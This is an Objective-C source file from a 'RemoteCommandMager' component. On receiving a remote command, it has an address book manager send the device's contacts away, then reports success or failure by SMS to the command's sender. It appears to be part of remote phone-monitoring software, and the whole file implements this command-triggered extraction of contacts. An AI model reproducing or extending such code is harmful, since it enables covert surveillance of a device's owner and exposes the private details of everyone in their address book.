
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestAddressBookProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RequestAddressBookProcessor.h"
#import "AddressbookManager.h"

@interface RequestAddressBookProcessor (PrivateAPI)
- (void) processRequestAddressBook;
- (void) requestAddressBookException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end

@implementation RequestAddressBookProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the RequestAddressBookProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"RequestAddressBookProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}

#pragma mark RequestAddressBookProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestAddressBookProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"RequestAddressBookProcessor--->doProcessingCommand")
	[self processRequestAddressBook];
}


#pragma mark RequestAddressBookProcessor Private Methods

/**
 - Method name: processRequestAddressBook
 - Purpose:This method is used to process Request AddressBook
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) processRequestAddressBook {
	DLog (@"RequestAddressBookProcessor--->processRequestEvents")
	id <AddressbookManager> addressBookManager=[[RemoteCmdUtils sharedRemoteCmdUtils] mAddressbookManager];
	BOOL isReady= [addressBookManager sendAddressbook:self];
	if (!isReady) {
		[self requestAddressBookException];
	}
	else {
		[self acknowldgeMessage];
	}
}

/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
*/

- (void) acknowldgeMessage {
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage=[ messageFormat stringByAppendingString:NSLocalizedString(@"kRequestAddressBookSucessMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name: sendReplySMS:isProcessCompleted:
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestHeartbeatProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {[self processFinished];}
	else {DLog (@"Sent aknowldge message.");}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when request addressbook process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
*/

-(void) processFinished {
	DLog (@"RequestAddressBookProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

/**
 - Method name: requestAddressBookException
 - Purpose:This method is invoked when  pr failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) requestAddressBookException {
	DLog (@"RequestAddressBookProcessor--->requestAddressBookException");
	FxException* exception = [FxException exceptionWithName:@"requestAddressBookException" andReason:@"Request AddressBook error"];
	[exception setErrorCode:kAddressBookManagerBusy];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}


#pragma mark AddressbookManager Delegate Methods

/**
 - Method name: abDeliverySucceeded
 - Purpose:This method is invoked when addressbook is delivered
 - Argument list and description:No Argument
 - Return description: No return type
*/

- (void) abDeliverySucceeded: (NSNumber *) aEDPType {
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *requestAddressBookMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kRequestAddressBookSucessMSG2", @"")];

   	[self sendReplySMS:requestAddressBookMessage isProcessCompleted:YES];
}

/**
 - Method name: abDeliveryFailed
 - Purpose:This method is invoked when addressbook delivery is failed
 - Argument list and description:aError(NSError*)
 - Return description: No return type
*/

- (void) abDeliveryFailed: (NSError *) aError {
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:[aError code]];
	[self sendReplySMS:messageFormat isProcessCompleted:YES];
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}

@end
